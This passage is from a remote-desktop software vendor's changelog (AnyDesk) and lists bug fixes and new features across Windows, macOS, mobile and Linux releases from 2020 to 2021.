- Fixed bug that prevented each identically named address book to be opened individually
- Fixed permanently disabling the clipboard when the backend removes the clipboard permission
- Fixed availability of session invitation feature based on feature switches for invitations and the availability of features connect/accept
- Fixed availability of action to cancel an invitation
- Fixed availability of actions un/favorite in address book
- Fixed availability of action to remove a single contact only when multiple ones are selected
- Fixed bug in handling session setting for option to follow remote window focus
- Fixed adaptive image quality option (skipped applying settings for invalid bandwidth and re-enabled the feature again)
- Fixed bug that caused tcp-tunnels to not work on backend side
- Fixed permission restoration after remote restart, elevation and in case of backend crashes
- Fixed save login information option was not working properly
- Fixed rejecting incoming connections for outgoing-only CC
- Fixed remote restart dialog for not elevated backend
- Fixed always greyed-out remote restart action for old backends
- Fixed wake on lan settings page
- Fixed menu icons not rendering correctly
- Fixed settings panel visuals during horizontal resize
- Fixed opening address with spaces from toolbar during opened session
- Fixed bug that caused visual glitches in toolbar, when switching to file transfer panel during sessions
- Fixed missing DPI scaling for the messages box that appears when the accept window is closed with multiple sessions running
- Fixed mouse cursor flickering when moving inside hovered items
Other Changes
- Added missing network info popup for incoming-only client
- Improved behavior of text edit when renaming address items
- Improved visuals of check boxes and radio buttons in disabled state
- Improved clarity of session invitation dialog to prevent misconception about being able to send it to any email address
- Improved localization for actions on invitations
- Improved Russian and Portuguese (Brazil) localization
- Extended GPT with keys for more features switches, screen frame and alternate screen background
- Disabled combo box to select profiles if there is only a single profile to select
- Removed irrelevant settings sections for incoming only and outgoing only clients
- Moved custom logo to the top right
- Restored possibility to connect to relays on port 80 through http proxy
21.12.2021 - 6.4.0 (macOS)
--------------------------
New features
- MDM/Group Policies support (custom clients only)
Fixed bugs
- addressed a latency issue with 120Hz ProMotion screens
- automatic Anydesk new version check is fixed
Important note
We plan to discontinue macOS 10.11 (El Capitan) support soon. AnyDesk strongly recommends you to upgrade your system.
07.12.2021 6.4.0 (Android)
--------------------------
New Features
- Improved access to keyboards.
- Minor improvements.
Fixed Bugs
- Improved direct connections.
- Fixed connection issues to iOS.
- Fixed file transfer on Android 10.
- Minor fixes.
24.11.2021 - 5.6.2 (iOS)
------------------------
Fixed Bugs
- Minor bug fixes and improvements
19.11.2021 - 7.0.4 (Windows)
----------------------------
Fixed Bugs
- Fixed bug where profile dialogs would not have the correct size
- Fixed transfer of remote system information
- Fixed follow remote window focus option behaving incorrectly when used with multiple sessions to same remote device
- Fixed visuals of dialog to enter two-factor-auth verifaction code
- Fixed rare crash in accept window
- Fixed Welcome Panel get started button visibility on small screens in maximized mode
- Fixed precondition for crash in installer
- Fixed file browser dialog title and padding
- Added precautions to fix crashes related to timers
- Fixed issues that made CLI commands behave unexpectedly when another AnyDesk instance was running
Other Changes
- hide permission UI elements after a session is closed
- Add some more tooltips
18.11.2021 - 7.0.3 (Windows)
----------------------------
Fixed Bugs
- Fixed display issues for specific AnyDesk IDs
- Fixed bug that caused the focused display indicator to not update immediately
- Fixed bug that caused a UI issue in the permissions of the accept panel.
- Fixed rare crash in backend session handling
- Fixed rare crash related to session invitation
- Fixed rare crash related to permission profile manager
- Added checks to prevent a crash related to mouse cursor rendering
- Added checks to prevent a crash related to session disconnects
- Fixed some missing error texts for printing messages in backend
- Fixed capitalization of section headers in main view in most languages
- Fixed some tooltip positions
- Close color menues when scrolling in privacy settings
18.11.2021 - 6.3.3 (macOS)
--------------------------
Fixed bugs
- Fit the anydesk window into new macbook screens with camera housing
- Fixed the crash on M1 computers running macOS Monterey
17.11.2021 - 7.0.2 (Windows)
----------------------------
Fixed Bugs
- Fixed bug that could cause old unattended access passwords to not work
- Fixed config migration issue
- Fixed text wrapping in chat for long words
- Fixed crash when word wrapping fails in chat
- Fixed recent items address label visibility
- Fixed rare crash on application start up
- Fixed crash in control that was caused by registering duplicate packet handlers
16.11.2021 - 7.0.1 (Windows)
----------------------------
Fixed Bugs
- Fixed crash in custom clients with disclaimer
- Fixed minor title bar rendering bug in global settings
- Fixed minor issues with in app messaging
Other Changes
- Improved french translation
15.11.2021 - 7.0.0 (Windows)
----------------------------
New Features
- Modernize User Interface
- Introducing Permission Profiles
- Introducing Session Invitation
- Introducing Screen Frame feature
- Introducing Alternate Screen Background
- Added option to disable session recording feature via custom clients
Fixed Bugs
- Session Player is now resizable
- Session Player now correctly opens when double clicking recording files
- Fixed enabling and disabling clipboard permissions during sessions
- Fixed handling of multiple simultaneous session requests
Other Changes
- Improved localization for many languages
- Improved tooltips
- Added command line option to generate Group Policy Template
- Allow full text selection and copy in chat windows
- Session Player now works with incoming only custom clients
- Added better error message when auto-discovery fails
- Added support for new input method on Android
08.11.2021 - 6.3.5 (Windows)
----------------------------
Fixed Bugs
- Fixed a common issue with direct connections
- Fixed a bug that caused clipboard file transfer to misbehave
21.10.2021 - 5.6.1 (iOS)
------------------------
Fixed Bugs
- Minor bug fixes and improvements
22.09.2021 - 6.3.4 (Android)
----------------------------
Fixed Bugs
- Improved chinese translations.
- Fixed direct connection setup.
- Fixed setting on-premises configuration.
- Improved stability.
- Minor improvements and fixes.
21.09.2021 - 6.3.2 (macOS)
--------------------------
New features
- Send invitation e-mail
- 'Toggle Toolbar' menu option
Fixed bugs
- Direct connection reliability improved
- 'Zoom' function resizes the session window properly
- Incoming session is no longer failing for certain macOS system languages
- Minor UI improvements
21.09.2021 - 5.6.0 (iOS)
--------------------------
New features
- Whiteboard
- MDM expanded to include more possible config items
Fixed bugs
- Fixed issue that sometimes prevented direct connections
- Improved file transfer
07.09.2021 - 6.3.3 (Windows)
----------------------------
Fixed Bugs
- Fixed issue that sometimes prevented direct connections
19.08.2021 - 6.3.2 (Android)
----------------------------
Fixed Bugs
- Improved stability.
- Minor improvements and fixes.
27.08.2021 - 6.3.1 (macOS)
--------------------------
New features
- URL handler for anydesk addresses
Fixed bugs
- macOS Privacy Permissions warning in File Manager has proper color now
06.08.2021 - 6.3.0 (Android)
----------------------------
New Features
- New input method: Send full sentences and emojis.
This fixes issues with non-english characters and non-standard input methods.
- Added button to send trace file over active session.
Fixed Bugs
- Fixed file manager home path.
- Fixed crash when applying group policies.
- Fixed rendering issues of privacy statement and help center.
- Fixed injection of some characters.
- Minor improvements and fixes.
30.07.2021 - 5.5.1
New features
- Added possibility to cancel uploading file
Fixed bugs
- Fixed crash during displaying 2FA dialog when app goes background
- Fixed visibility in autodiscovery
21.07.2021 - 6.3.0 (macOS)
--------------------------
New features
- Scam warning dialog appears on suspicious incoming connection requests
- AnyDesk is also offered as a PKG installer
Fixed bugs
- Fixed crash on recordins playback (m1 macs)
- Improved network discovery reliability
- Fixed crash when running AnyDesk in Rosetta 2 mode
- UI glitches for specific custom client configurations
- Fixed crash during alias registration
- Fixed window sizing issues
25.06.2021 - 5.5.0 (iOS)
------------------------
New Features:
- MDM support
- External monitor support
- Apple Pencil scribble support
- Other way of sending trace file when email client not configured
Fixed Bugs:
- Fixed black screen during connection to device with multiple monitors
- Fixed not displaying 2FA dialog when password saved
26.06.2021 - 5.5.0 (tvOS)
-------------------------
New Features:
- MDM support
- Sending trace file via AnyDesk file transfer
Fixed Bugs:
- Fixed black screen during connection to device with multiple monitors
- Fixed not displaying 2FA dialog when password saved
17.06.2021 - 6.3.2 (Windows)
----------------------------
Fixed Bugs
- Session comments did not work with license type Performance
- Fixed automatic detection of languages Ukrainian and Lithuanian
- The favorite button in the toolbar address field did not work
- Some trace output got lost in case no user was logged in
- Tagging multiple Address Book items failed in case some items already contained some of the tags used
Other Changes
- Updated translations for Portuguese (Brazil)
- Improved discoverability of Address Book pagination
- Changed default audio/video quality setting from balanced to best
- Improved trace output for the case of certificate validation failure
- Added option to remove a single Address Book item even if multiple items are selected
14.06.2021 - 6.2.2 (Android)
----------------------------
New Features
- Support for new plugins.
Fixed Bugs
- Fixed proxy settings. Changes in the proxy settings were not applied.
- Fixed conflict between system back gesture and pie menu.
- Fixed plugin download on some devices when browser app is not available.
- Improved translations.
15.05.2021 - 6.2.0 (macOS)
--------------------------
New features
- macOS native window and tab management: reorder tabs, drag-n-drop tabs between windows
- Follow mouse cursor feature: When activated, the monitor selection follows the remote mouse cursor
- Follow remote window focus feature: When activated, the monitor selection follows the remote focused window
- Reminder Tile to install the anydesk service
Fixed bugs
- Fixed crash on session start
- Mouse cursor issues when session recording is finishe
18.05.2021 - 6.3.1 (Windows)
----------------------------
New Features
- Added the option to revert remote resolution after automatically adapting it to fit the local viewport.
Support by both sides is required for this feature to be available.
Fixed Bugs
- Fixed a common crash when requesting elevation
- Fixed a number of bugs related to address book pagination
- Fixed a crash in the recorded sessions player
- Fixed bug that reported deletion of local files to remote user in file transfer panel
Other Changes
- Increase security by requiring stronger passwords when setting it via command line
07.05.2021 - 6.3.0 (Windows)
----------------------------
New Features
- Improved network stability and speed.
Fixed Bugs
- Fixed column sort behavior of file fransfer view
- Fixed scrolling issue in chat view on Windows 10
Other Changes
- Improved localization for German, Czech, Portuguese and Portuguese (Brazil)
15.04.2021 - 6.1.1 (Linux/BSD/Raspberry Pi)
-------------------------------------------
New Features:
- Added function that compresses all necessary logfiles when communicating with support
Fixed Bugs:
- Fixed a visual glitch in the Address Book
- Fixed a bug where a session recording may not play immediately
- Fixed a bug where the user got stuck with "waiting for image"
- Fixed a bug that caused image artifacts to appear during sessions
- Fixed a memory leak in the video codec
Other:
- Removed social media buttons
- Removed capture tab from settings, since it is not needed anymore due to fixing the image artifacts
14.04.2021 - 6.1.12 (Android)
-----------------------------
New Features
\* Support for new plugins.
13.04.2021 - 6.1.4 (macOS)
--------------------------
New features
- Added CLI commands: Set Password, Register Licence, Get Alias, ID, Status or Version. More info by the link https://support.anydesk.com/Command\_Line\_Interface
08.03.2021 - 6.2.3 (Windows)
----------------------------
New Features
- Added global security setting to lock the remote account
If active the corresponding session setting will be ignored
Fixed Bugs
- Fixed network detection
- Fixed image glitches occurring during sessions
- Could block remote input without input permissions granted
- Could lock the remote account without input permissions granted
Other Changes
- Updated translations for German, English and Italian
- Added Lithuanian translation. Many thanks to Andrius BalseviÄius!
05.03.2021 - 5.4.0 (iOS)
------------------------
New Features:
- Security warning
- Batch operations in file manager
03.03.2021 - 6.1.10 (Android)
-----------------------------
New Features
\* Support for configuration via App Restrictions (e.g. Microsoft Intunes).
Fixed Bugs
\* Fixed remote image artefacts.
\* Minor improvements and fixes.
01.03.2021 - 6.1.2 (macOS)
--------------------------
New features
- New option to transfer image in native (Retina) resolution
Fixed bugs
- Mouse pointer coordinate transfer issue on multi-monitor system is fixed
- Bug which may cause image rendering glitches is fixed
18.02.2021 - 6.2.2 (Windows)
----------------------------
Fixed Bugs
- Fixed crash when opening installer
- Fixed crash when opening settings in in-only Custom Clients
12.02.2021 - 6.2.1 (Windows)
----------------------------
New Features
- Added pagination to address book
- Added UI setting to permanently remove tiles from the main view of custom clients related to
- password for unattended access
- 'Whats new?'
- Discovery
Fixed Bugs
- Removed everything related to invitations and the option to recommend AnyDesk via mail, when disabled in custom clients
- Fixed crash when closing a session
28.01.2021 - 6.1.0 (Linux/BSD/Raspberry Pi)
-------------------------------------------
New Features:
- Added lossless color mode
- Reworked the session recording settings
- Follow mouse mode
- Follow focused window mode
- Improved 2FA
- Improved Wake on LAN
- Implemented auto-disconnect feature
- Add Android special keys to keyboard menu
- Added transmit hotkeys as a session setting in the menu
Fixed Bugs:
- Fixed a crash in the session player
- Fixed a bug that caused AnyDesk to crash when switching to the login screen
- Fixed a bug that caused the icon for direct connections not update properly
- Fixed a bug that caused graphical glitches at the beginning of session recordings in the player
Other:
- Dropped 32bit Linux support
27.01.2021 - 6.1.1 (macOS)
--------------------------
New features
- Address book supports moving and copying items via drag'n'drop
- Create desktop shortcuts for AnyDesk sessions via drag'n'drop
- 'Auto-adapt Resolution' option in Display menu is now supported
Fixed Bugs
- Error which prevented some users from starting AnyDesk is fixed
- Error which prevented some customers from accessing Address Book is fixed
- Privacy feature availability is now properly reported for older macOS versions
- AnyDesk doesn't light up the remote screen when only 'File Manager' feature is used
27.01.2021 - 6.1.5 (Windows)
----------------------------
Fixed Bugs
- Fixed bug that caused elevation requests to fail
22.01.2021 - 6.1.6 (Android)
----------------------------
New Features
- Manage plugin through AnyDesk app to reduce number of launcher icons.
Fixed Bugs
- Fixed crash in session recording settings.
21.01.2021 - 6.1.4 (Windows)
----------------------------
New Features
- Added option --remove-password to remove password for unattended access via command line
Fixed Bugs
- Fixed crash related to muting audio during privacy mode
- Fixed alias registration in incoming connection only clients
- Fixed window size problems in some cases in incoming connection only client
- Fixed cursor rendering when using DirectDraw
- Fixed scaling of custom logos
- Fixed bug that caused address book tags to not show on individual addresses
- Fixed crashes related to displays with large resolutions
- Fixed bug that caused incorrect keyboard handling on windows login screen
Other Changes
- Improved memory usage when using preserve details option
18.01.2021 - 6.1.4 (Android)
----------------------------
New Features
\* Auto switch to monitor with focus:
Automatically switches to remote monitor that has
the focused window.
\* Lock remote desk on session end:
If supported by the remote desk, automatically
locks remote desk when the session ends.
\* Auto disconnect:
Disconnects incoming connections after a
configurable time of inactivity.
\* Support for high quality screen transmission.
Fixed Bugs
\* Fixed injection of wrong touch coordinates on Samsung devices.
\* Improved injection of special characters on Samsung devices.
\* Minor improvements and fixes.
18.01.2021 - 5.3.0 (iOS)
------------------------
New Features:
- Added Device and Microphone Audio Transmission
- Added display option to preserve details when encoding image
Fixed Bugs:
- Fixed saving image/video to photo library
18.01.2021 - 5.3.0 (tvOS)
-------------------------
New Features:
- Added display option to preserve details when encoding image
08.12.2020 - 6.1.0 (Windows)
----------------------------
New Features
- Added option to follow remote window focus
- Added display option to preserve details when encoding image
- Added option to limit number of incoming/outgoing sessions for custom clients
- Added option to automatically disconnect incoming sessions when inactive
- Added option to keyboard menu to send special Android keys
- Revised favorites and recent session lists
- Revised session recording settings
- Address Book, Auto-Discovery, Favorites and Recent Sessions now interact with the system clipboard
Fixed Bugs
- Fixed crash when requesting elevation
- Fixed crash in session player when skipping to the beginning of a recording
- Fixed crash caused by invalid thumbnails when searching for addresses
- Fixed crash when updating Windows Group Policies
- Fixed a crash when updating cursor shape
- Fixed bug that caused keyboard mode to be reset every session
- Fixed bug that caused sessions settings for remote cursor to not save correctly
- Fixed bug that caused empty session recordings to be created
- Fixed alias registration in incoming only clients
- Fixed rare bug that caused settings configured via Group Policies to not work correctly
- Fixed discovery section showing up when it shouldn't
- Fixed language detection for some asian languages
- Fixed language selection on Windows XP
- Fixed several minor memory leaks
- Fixed several visual issues
Other Changes
- Improved one time password checks in two factor authentication
- Loosened restrictions on minimal windows size
30.11.2020 - 5.2.0 (iOS)
------------------------
New Features:
- Magic Keyboard support
- File sharing extension
- Request remote restart
- Lock account on session end
- Follow remote window focus
Fixed Bugs:
- Fixed "Synchronize clipboard" setting
- Fixed language detection for Chinese Traditional
- Fixed that AnyDesk ID was not shown on start
- Fixed keeping app alive in background (30 sec.) during file transfer and inserting 2FA code
- Fixed "File not found" bug
- Fixed small UI bugs
30.11.2020 - 5.2.0 (tvOS)
-------------------------
New Features:
- Request remote restart
- Lock account on session end
- Follow remote window focus
Fixed Bugs:
- Fixed language detection for Chinese Traditional
- Fixed small UI bugs
12.11.2020 - 6.1.0 (macOS)
--------------------------
New features
- macOS 11 Big Sur support
- Apple Silicon Macs support
Fixed Bugs
- Fixed bug when comment was not being asked on closing the session
- File Manager UI layout issues fixed
- Accept window layout fixes
23.10.2020 - 5.1.0 (iOS)
------------------------
New Features
- File transfer client
07.10.2020 - 6.0.3 (macOS)
--------------------------
Fixed Bugs
- Separated settings for incoming and outgoing automatic session recording
- Security improved for configurations with AnyDesk service installed
- Fixed bug when remote mouse cursor has a wrong shape when using specific applications
06.10.2020 - 6.1.2 (Android)
----------------------------
New Features
\* Added notification when a new plugin version is available.
\* Added option to convert mouse events to touch events.
This fixes unclickable UI elements.
Fixed Bugs
\* Improved keyboard handling.
\* Fixed key event transmission on Android 10 and higher.
\* Minor improvements and fixes.
22.09.2020 - 6.0.2 (macOS)
--------------------------
Fixed Bugs
- Improved Settings for Interactive access
- Fixed menu actions for File Transfer and VPN sessions
- Main window startup position issue fixed
- Custom client overrides for session permissions fixed
- Fixed Screen Recording permission detection for Chinese users
Important note
Version 6.0.2 is the last to support macOS 10.10 (Yosemite). We strongly recommend you to upgrade your system in order to receive further AnyDesk updates.
09.09.2020 - 6.1.0 (Android)
----------------------------
New Features
- Edit mode for address book. Add/remove address books and entries.
- Searching for multiple words in speed dial and address book.
- Wake on LAN now discovers wakable devices in network. No need to configure the wake source anymore.
- Support for connection to new iOS client.
Fixed Bugs
- Fixed searching for alias in discovered items.
- Fixed address book not beeing available on first start of AnyDesk.
- Fixed disabling address book in custom client.
01.09.2020 - 6.0.8 (Windows)
----------------------------
Fixed Bugs
- Fixed connectivity information bar not showing up in some cases
- Fixed deadlock in installer
- Fixed bug that could cause extra key up events to be triggered
- Fixed incorrect tab selection on startup when connecting via desktop schortcut
- Fixed scroll behavior of chat window when receiving messages
Other Changes
- Support for improved connections to iOS devices
26.08.2020 - 6.0.1 (macOS)
--------------------------
- Support for improved connections to iOS devices
Fixed Bugs
- Fixed disabled context menu on Speed Dial items
25.08.2020 - 6.0.1 (Linux/BSD/Raspberry Pi)
-------------------------------------------
New Features:
- Added "capture" panel in settings to disable XDamage for Computers that
have issues with screen artifacting (Warning: Might impact performance)
- Support for improved connections to iOS devices
Fixed Bugs:
- Fixed a deadlock that could occur at the beginning of a session, resulting
in "Waiting for Image" to never disappear
- Fixed a bug in Raspberry Pi that lead to Pi 4 beeing unusable
06.08.2020 - 6.0.0 (macOS)
--------------------------
New Features
- Two-factor authentication
- Wake on LAN
- Hide individual item groups in Speed Dial
Fixed Bugs
- Fixed bug when keyboard layout does not match to input into Unattended Access password dialog
- Fixed issue which prevented renaming of Speed Dial items
- Fixed issue when sleeping mac reported incorrect online state
- Improved Preferences window behaviour
Important note
We plan to discontinue macOS 10.10 (Yosemite) support soon. AnyDesk strongly recommends you to upgrade your system.
28.07.2020 - 6.0.4 (Android)
----------------------------
Fixed Bugs
\* Fixed crash on Android 4 and 5
28.07.2020 - 6.0.0 (Linux)
-------------------------------------------
New Features:
- AnyDesk now supports Perfect Forward Secrecy.
- Added Two-Factor Authentication.
When enabled, an additional dialog will be shown after authentication by
password or token, asking for a time-based one-time password provided by a
third device. This requires that device to run an app supporting TOTP.
- Added Wake-On-LAN.
When enabled, devices running AnyDesk that are currently in sleep mode can be
woken up by other AnyDesk devices in the same local network.
- The frontend will now refuse to start as root
Fixed Bugs:
- Fixed AnyDesk beeing unusable on Dark Themes by defaulting to Adwaita Theme
- Fixed "Open Address Book on Startup" showing the premium dialog even on
paid licenses
- Fixed wallpaper not change when re-transmited for speed dial
- Fixed keyboard layout change on Fedora 31
- Fixed chat icon having the wrong state
28.07.2020 - 6.0.7 (Windows)
----------------------------
Fixed Bugs
- Fixed some potential deadlocks
- Fixed bug that could cause AnyDesk to close immediately after starting
27.07.2020 - 4.4.0 (iOS)
------------------------
New Features
- Support for Two Factor Authentication
- Start/stop session recording
22.07.2020 - 6.0.2 (Android)
----------------------------
Fixed Bugs
\* Changed the default setting for interactive access back to "When AnyDesk is visible"
21.07.2020 - 6.0.6 (Windows)
----------------------------
Fixed Bugs
- Fixed connection status visibility issue
- Fixed incorrect behaviour when connecting via shortcut or command line
- Fixed crash in address book
- Fixed renaming of address book entries
- Fixed dpi scaling issue in dialog to manage address books
- Fixed timeout behavior when trying to connect to offline client
- Fixed some blurry icons
17.07.2020 - 5.6.0 (macOS)
--------------------------
New Features
- Drag'n'drop to Applications folder installation method is offered by default now (legacy install method is still supported)
- "Install AnyDesk Service" menu option added
- VPN support added
- Run user script when TCP tunnel is connected
- Support for connecting Two-factor authentication enabled hosts
Fixed Bugs
- Fixed bug when admin password was asked several times during the install
- Grey bounds inside remote session window are no longer sensitive for mouse motion and clicks
- Tags displayed correctly in Address book thumbnail mode
- Fixed application crash on macOS Big Sur beta
- Fixed issue with edit of Favorite items list
14.07.2020 - 6.0.0 (Android)
----------------------------
\* Settings can be protected by device security
\* Implemented Access Control List
\* Read only address book
\* Start/stop session recording
\* WOL: Android can be used to wake other devices in the network
\* Fixed some dialog states after orientation change
\* Fixed 3-finger scroll in touchpad mode
\* Fixed layouts in RTL
24.06.2020 - 5.5.6 (Android)
----------------------------
\* Improved AndroidTV support (opening settings)
\* Using internal WebView for web links instead of external browser
10.07.2020 - 6.0.5 (Windows)
----------------------------
Fixed Bugs
- Made the Address Book open on startup again.
- Fixed some DPI scaling issues.
- Fixed minor layout issues
- Fixed bug that caused the client to sometimes close immediately after starting.
- Fixed a stack overflow in the settings.
- Fixed a crash during download.
- Fixed a crash in Wake-On-LAN.
Other Changes
- Updated translations
25.06.2020 - 6.0.0 (Windows)
----------------------------
New Features
- Updated the user interface.
- AnyDesk now supports Perfect Forward Secrecy.
- Added Two-Factor Authentication.
When enabled, an additional dialog will be shown after authentication by
password or token, asking for a time-based one-time password provided by a
third device. This requires that device to run an app supporting TOTP.
- Added Wake-On-LAN.
When enabled, devices running AnyDesk that are currently in sleep mode can be
woken up by other AnyDesk devices in the same local network.
- Added support for Windows Group Policies.
AnyDesk now checks the Windows Registry for settings provided via Group
Policies. This can only be disabled in Custom Clients.
- Unattended Access now allows the setup of multiple secondary passwords.
Each of the passwords can be bound to different permissions.
This feature requires the use of Windows Group Policies.
- Session Recordings can now be started and stopped at any time.
- The Printer now also supports printing local files on the remote side.
- Monitors can now be switched using hotkeys.
Use Ctrl + Alt + Shift + left/right to iterate monitors.
Use Ctrl + Alt + Shift + numpad numbers to switch to a specific monitor.
- The search now also takes Address Books into account.
- The session monitor tabs now show where the keyboard focus is.
- Allowed to drop address item selection by pressing 'Esc'.
- Added a second default setting for Interactive Access.
Immediately installing AnyDesk now allows to connect to that Desk directly
from the beginning. It is no longer required to open a window or to explicitly
change the corresponding setting.
- Turned the link to set up a password into a tile to improve its visibility.
- Added a tile allowing to go back to the Welcome Page.
- Allowed to hide the sidebar on the left.
- Allowed to hide the box 'Remote Desk'.
Fixed Bugs
- Made the Printer work again on Windows 7.
- Fixed a crash during accept with elevation.
- Fixed a crash when closing a session via the main window's session tab.
- Fixed a crash on Address Book entry creation in case no Address Book has been
created.
- Fixed key release on the remote side in case the controlling side lost focus.
- Ctrl + mouse click sometimes did not work.
- Ctrl + Pause was not transmitted.
- Using the File Manager stopped keyboard input transmission.
- The minimized D3D fullscreen mode did not stop keyboard input transmission.
- The File Manager did not initially sort files and folders.
- Added missing error message in File Manager for the case an upload is not
possible due to missing access rights.
- The main window of a Custom Client allowing only incoming sessions looked
different when moving it to a monitor with different DPI settings.
- The Whiteboard button in the toolbar was enabled even though Whiteboard
permission was not given.
- Adding an item to an Address Book worked only once.
- The account was not locked after session end in case the accept window stayed
open.
- The button to Switch Sides was displayed on session start.
- Discovery showed clients that actually did not exist.
- A busy indicator was shown in the settings.
- Settings requiring administrative rights were not locked directly after
installation of AnyDesk.
- The rename function for addresses allowed ,;
- Address items in different sections in the main view could have been selected
at the same time.
- The EULA link was not clickable everywhere.
Other Changes
- Reduced the number of UAC dialogs shown during installation of different
components of AnyDesk.
- Updated translations.
06.07.2020 - 4.3.0 (iOS)
------------------------
New Features
- Session recording
- System information
- Support for multi-touch events
Fixed Bugs
- minor improvements and fixes
10.06.2020 - 5.5.3 (macOS)
--------------------------
New Features
- Thumbnail view mode has been added to Address Book
- Option to disable automatic startup of AnyDesk has been added
- Split Full Screen experience enabled for Connection Window and Address Book
Fixed Bugs
- 'New Window' function now works for older macOS versions too
- keyboard input from mobile devices improved
- fixed visual glitches in main window
- File Manager shows warning when Full Disk Access permission missed
- Connection type icon displayed correctly
- fixed bug when Unattended access password sometimes not accepted
- fixed Installer bug which might lead to unexpected admin authorization
requests
06.05.2020 - 5.5.2 (macOS)
--------------------------
New Features
- Access Control List (whitelist for incoming connections)
- Multiple session windows support
Fixed bugs
- Improved Address Book
- Fixed memory leaks
- Fixed bug when new connection window might appear empty
- Improved macOS privacy permissions handling
- Fixed installation bug which leaded to unexpected AnyDesk ID and settings
change
- Fixed bugs in file transfer
- Fixed crash when many sessions opened at the same time
- Improved compatibility with 3rd party software
21.04.2020 - 5.5.1 (macOS)
--------------------------
Fixed bugs
- Fixed a crash when user account picture is not set
20.04.2020 - 5.5.0 (Android)
----------------------------
New Features
- New discovery protocol
- Support for kiosk mode if whitelisted
- Replaced overflow button on speed dial items with long-press action
Fixed Bugs
- Improved stability
- Minor improvements and fixes
20.04.2020 - 5.5.5 (Linux/BSD/Raspberry Pi)
-------------------------------------------
New Features:
- Significantly improved Discovery security.
- Added a button to start/stop session recording on the fly
Bugs Fixed:
- Fixed online states
- Fixed a deadlock in the frontend
17.04.2020 - 5.5.0 (macOS)
--------------------------
New Features
- Address Book new design
- TCP Tunnels
- System Information
- Start/Stop recording during the active session
- New About window design
Fixed bugs
- Network Discovery security improved
- Fixed remote restart issue
- Accept window security improvement
- Fixed Password change UI for unattended access
- Fixed Proxy configuration settings UI
- Mouse scroll sensitivity adjusted
- Optimised power usage for mac laptops
09.04.2020 - 5.5.3 (Windows)
----------------------------
Fixed Bugs
- Fixed a timer duration exceeding integer boundaries.
03.04.2020 - 5.5.2 (Windows)
----------------------------
Fixed Bugs
- Fixed a crash when marking AnyDesk addresses as favorites.
- Fixed a bug that caused keyboard input to stop working.
- Fixed a bug that could cause AnyDesk to consume unreasonably high amounts of
CPU time.
- Fixed Privacy Mode for Custom Clients.
- Improved error handling.
11.03.2020 - 5.5.0 (Windows)
----------------------------
New Features
- The backend user can now accept an incoming session request and immediately
request elevation.
- Significantly improved Discovery security.
- The remote activity indicators can now be de-/activated by clicking on them.
- Added an option to set up an Alias on the UI settings page.
- The toolbar can now be hidden during a session via the session tab menu.
- Reintroduced the invitation link in the main view. This requires a properly
set up default mail client to work.
- The link 'Send Support Information...' on the page 'About AnyDesk' in the
settings now tries to create a mail containing required files instead of
copying them to a folder on the desktop. This requires a properly set up
default mail client to work.
Fixed Bugs
- Custom Clients may have cut ID and Alias in a list view.
- Connecting using the command line led to missing session infos on the
backend side.
- An additional monitor appeared on opening the File Manager.
- The Whiteboard didn't delete shapes on session end.
- Recordings of incoming sessions have not been saved to the default path.
- The File Manager enabled file upload even though it was disallowed.
- Custom Clients allowing only incoming sessions did not support Remote
Restart.
- Could not create Address Book tags containing whitespace.
- Clients using a Power license did not allow to set session comments.
- Fixed a crash while playing back a session recording.
- A tab's icon stating the session is being recorded may have overlapped with
the tab's close button.
- The permission for Privacy Mode has not been shown in the session info
popup.
- The chat log could not been opened during a session at the frontend side.
- Fixed a crash occurring when opening the session info popup.
- Focusing AnyDesk address items may have been selected erroneously.
- Fixed a couple of memory leaks.
- Fixed a deadlock in the service making it unresponsive to session requests.
- Fixed a crash in the service when connecting to multiple IDs at once.
- Fixed a crash during Discovery shutdown.
- Fixed a crash during main window shutdown.
- Fixed a crash related to the remote system info popup.
- Fixed some minor bugs.
Other Changes
- In fullscreen mode borders around the remote image are black now.
- Updated translations.
02.04.2020 - 5.4.6 (macOS)
----------------------------
Fixed Bugs
- Improved error handling
- Better macOS privacy permissions handling
25.03.2020 - 5.4.0 (Android)
----------------------------
New Features
- Added plugin for Android devices.
25.02.2020 - 5.5.4 (Linux / Raspberry Pi / FreeBSD)
---------------------------------------------------
Fixed Bugs
- Fixed a bug that might cause 32bit versions to fail
21.02.2020 - 5.5.3 (Linux / Raspberry Pi / FreeBSD)
------------------------------------------
Fixed Bugs
- Fixed a security vulnerability
Other changes
- Hardened Linux/FreeBSD/RPi via FULL RELRO
18.02.2020 - 5.5.2 (Raspberry Pi)
---------------------------------
Added features
- Added unattended access priviledges in the security settings which can override the standart permissions if connected via unattended access
- Added lock account on session end feature
Fixed Bugs
- Fixed wrong permissions in the backend
- Minor bugfixes in the filetransfer
- Fixed a wrong error message when registering an alias that is too long
- Fixed an issue where the recording path could not be set
- Fixed a bug that the decimal point on the numpad was not transmitted correctly
- Fixed a deadlock that could occur on the backend side if text was input too fast from the frontend
- Fixed a bug where the admin settings could be opened as normal user (but changes were not possible)
- Fixed wrong settings page beeing displayed when opening global settings
- Fixed a bug in the keyboard code
- Fixed a bug where the wrong keyboard layout was used in some distros and on some loginscreens
- Fixed several UI glitches
- Fixed the admin link not beeing shown in the recording settings
- Fixed the recording settings so that no useless config can be made
- Fixed some minor glitches in the custom client
- Fixed the display of the wrong error dialog in filetransfer
- Fixed a bug where the wrong accept window page was re-used
- Fixed onlinestates beeing shown incorrectly
- Fixed a memory leak in the filetransfer
- Fixed a crash/deadlock in the filetransfer
- Fixed searching and typing in the filebrowser via keyboard
- Fixed a bug where a network disconnect was not properly detected and took too much time
- Fixed a bug that would release modifier keys after typing one character on certain configs
- Fixed a memory leak in the backend
- Refactored X11 code to put much less load on X Serer
- Fixed primary monitor not beeing selected on session start
- Refactored GTK code to prevent images from leaking
18.02.2020 - 5.5.2 (BSD)
--------------------------
Added features
- Privacy indicator in the statusbar to always reflect privacy status
- Privacy will try to disable the screensaver to avoid failing
- Added unattended access priviledges in the security settings which can override the standart permissions if connected via unattended access
- Added lock account on session end feature
Fixed bugs:
- Fixed a memory leak in the backend
- Fixed a bug in the keyboard code
- Improved minor GUI details
- Refactored X11 code to put much less load on X Serer
- Fixed primary monitor not beeing selected on session start
- Refactored GTK code to prevent images from leaking
- Fixed sometimes input not beeing blocked in privacy as well as sometimes not beeing unblocked on privacy end
- Fixed wrong permissions in the backend
- Minor bugfixes in the filetransfer
- Fixed a wrong error message when registering an alias that is too long
- Fixed an issue where the recording path could not be set
- Fixed a bug that the decimal point on the numpad was not transmitted correctly
- Fixed a deadlock that could occur on the backend side if text was input too fast from the frontend
- Privacy will attempt to re-initialize if failed
- Privacy will now fail if some other tools tamper with gamma (e.g. redshift)
